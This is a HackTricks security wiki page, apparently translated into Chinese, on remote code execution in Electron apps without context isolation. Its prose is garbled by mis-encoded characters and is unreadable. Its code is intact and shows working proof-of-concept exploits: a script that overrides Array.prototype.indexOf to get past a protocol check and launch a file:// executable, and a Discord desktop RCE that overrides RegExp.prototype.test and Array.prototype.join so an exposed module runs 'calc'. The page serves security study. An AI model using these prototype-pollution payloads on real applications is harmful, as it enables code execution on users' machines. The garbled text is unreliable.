# Electron contextIsolation é€šè¿‡é¢„åŠ è½½ä»£ç å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ç¤ºä¾‹ 1

æ¥è‡ª [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30) çš„ç¤ºä¾‹

æ­¤ä»£ç ä½¿ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€ http(s) é“¾æ¥ï¼š

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

å¯ä»¥ä½¿ç”¨ç±»ä¼¼ `file:///C:/Windows/systemd32/calc.exe` çš„è·¯å¾„æ¥æ‰§è¡Œè®¡ç®—å™¨ï¼Œ`SAFE_PROTOCOLS.indexOf` æ­£åœ¨é˜»æ­¢è¿™ç§æƒ…å†µã€‚

å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ XSS æˆ–ä»»æ„é¡µé¢å¯¼èˆªæ³¨å…¥æ­¤ JS ä»£ç ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
ç”±äºè°ƒç”¨ `SAFE_PROTOCOLS.indexOf` å°†å§‹ç»ˆè¿”å› 1337ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ä¿æŠ¤å¹¶æ‰§è¡Œè®¡ç®—å™¨ã€‚æœ€ç»ˆåˆ©ç”¨ä»£ç ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
æŸ¥çœ‹åŸå§‹å¹»ç¯ç‰‡ï¼Œäº†è§£å…¶ä»–åœ¨ä¸æç¤ºè¯·æ±‚æƒé™çš„æƒ…å†µä¸‹æ‰§è¡Œç¨‹åºçš„æ–¹æ³•ã€‚

æ˜¾ç„¶ï¼Œå¦ä¸€ç§åŠ è½½å’Œæ‰§è¡Œä»£ç çš„æ–¹æ³•æ˜¯è®¿é—®ç±»ä¼¼äº `file://127.0.0.1/electron/rce.jar` çš„è·¯å¾„ã€‚

## ç¤ºä¾‹ 2ï¼šDiscord åº”ç”¨ç¨‹åº RCE

æ¥è‡ª [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

åœ¨æ£€æŸ¥é¢„åŠ è½½è„šæœ¬æ—¶ï¼Œæˆ‘å‘ç° Discord æš´éœ²äº†ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°å…è®¸é€šè¿‡ `DiscordNative.nativeModules.requireModule('MODULE-NAME')` è°ƒç”¨ä¸€äº›å…è®¸çš„æ¨¡å—ï¼Œè¿›å…¥ç½‘é¡µã€‚\
åœ¨è¿™é‡Œï¼Œæˆ‘æ— æ³•ç›´æ¥ä½¿ç”¨å¯ç”¨äº RCE çš„æ¨¡å—ï¼Œä¾‹å¦‚ _child\_process_ æ¨¡å—ï¼Œä½†æˆ‘**å‘ç°äº†ä¸€ä¸ªå¯ä»¥é€šè¿‡è¦†ç›– JavaScript å†…ç½®æ–¹æ³•**å¹¶å¹²æ‰°æš´éœ²æ¨¡å—æ‰§è¡Œçš„ä»£ç ï¼Œä»è€Œå®ç° RCEã€‚

ä»¥ä¸‹æ˜¯ PoCã€‚å½“æˆ‘ä» devTools è°ƒç”¨åœ¨ "_discord\_utils_" æ¨¡å—ä¸­å®šä¹‰çš„ `getGPUDriverVersions` å‡½æ•°æ—¶ï¼Œæˆ‘èƒ½å¤Ÿç¡®è®¤**è®¡ç®—å™¨**åº”ç”¨ç¨‹åºè¢«**å¼¹å‡º**ï¼ŒåŒæ—¶**è¦†ç›–äº† `RegExp.prototype.test` å’Œ `Array.prototype.join`**ã€‚
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` å‡½æ•°å°è¯•ä½¿ç”¨ "_execa_" åº“æ¥æ‰§è¡Œç¨‹åºï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
é€šå¸¸ _execa_ ä¼šå°è¯•æ‰§è¡Œç”± `nvidiaSmiPath` å˜é‡æŒ‡å®šçš„ "_nvidia-smi.exe_"ï¼Œä½†æ˜¯ç”±äºé‡å†™äº† `RegExp.prototype.test` å’Œ `Array.prototype.join`ï¼Œ**å‚æ•°åœ¨ \_execa\_\_ çš„å†…éƒ¨å¤„ç†ä¸­è¢«æ›¿æ¢ä¸º "**_**calc**_**"**ã€‚

å…·ä½“æ¥è¯´ï¼Œå‚æ•°æ˜¯é€šè¿‡æ›´æ”¹ä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†æ¥æ›¿æ¢çš„ã€‚

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
